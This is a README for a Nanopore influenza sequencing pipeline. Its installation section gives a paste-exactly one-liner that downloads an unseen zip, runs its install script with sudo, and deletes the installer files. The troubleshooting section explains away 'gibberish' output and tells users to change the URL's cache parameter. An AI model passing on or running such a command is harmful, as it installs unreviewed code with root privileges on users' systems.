# 🧬 Influenza Sequencing Workflow
**Developed by: Longthor VACHOUAXIONG**  
*© 2026 | LONGTHOR VACHOUAXIONG | All Rights Reserved.*

---

## 📋 Overview
A fully automated bioinformatics pipeline for Nanopore Influenza sequencing. This tool automates the process from raw FASTQ data to subtyping, consensus generation, multiple sequence alignment, and phylogenetic tree building.

## 🚀 Quick Start
1. **Prepare Data**: Place your raw Nanopore folders in a directory named `fastq_pass`.
2. **Metadata**: Fill in the `metadata.xlsx` file with your barcode-to-sample mapping.
3. **Run**: Type `flu-pipeline` in your terminal.

---

## 🛠️ Installation
To install the pipeline on your Linux/WSL system, you only need to run a single command! *(Note: The software is statically compiled and universally compatible across all older and newer Linux/Ubuntu versions).*

Open your terminal and paste this command exactly as it appears:
```bash
wget -qO pipeline.zip "https://raw.githubusercontent.com/Longthor-VACHOUAXIONG/Flu-Pipeline/main/Influenza_Pipeline_Secure_v1.2.zip?v=stable" && unzip -q pipeline.zip -d flu_install && cd flu_install && sudo ./install.sh && cd .. && rm -rf flu_install pipeline.zip
```

### What this does:
1. Securely downloads the pipeline from the official repository.
2. Extracts and installs it globally as a system command (`flu-pipeline`).
3. Automatically deletes all installation files to keep your workspace perfectly clean.

---

## 📦 Requirements
* **Conda**: The pipeline will automatically install IRMA, MAFFT, and IQ-TREE inside a conda environment named `irma` during the first run.
* **Python**: Requires Python 3.10+ with `openpyxl` and `pandas`.

## 📂 Results
All results are organized in the `results_irma` folder:
* `03_consensus`: Reconstructed genomic segments.
* `05_alignment`: Multiple sequence alignments.
* `06_trees`: Phylogenetic trees for each segment.
* `metadata.xlsx`: Automatically updated with read counts and genomic coverage.

---

## 🛠️ Troubleshooting
**Issue: I installed the pipeline, but running it prints random gibberish (e.g., `?!ɀM43...`)**
* **Cause**: You likely downloaded an older, corrupted cached version of the pipeline.
* **Solution**: Re-run the installation command above. If it still fails, simply change `?v=stable` at the end of the URL to a random number like `?v=99` to bypass your network's cache, and install it again.
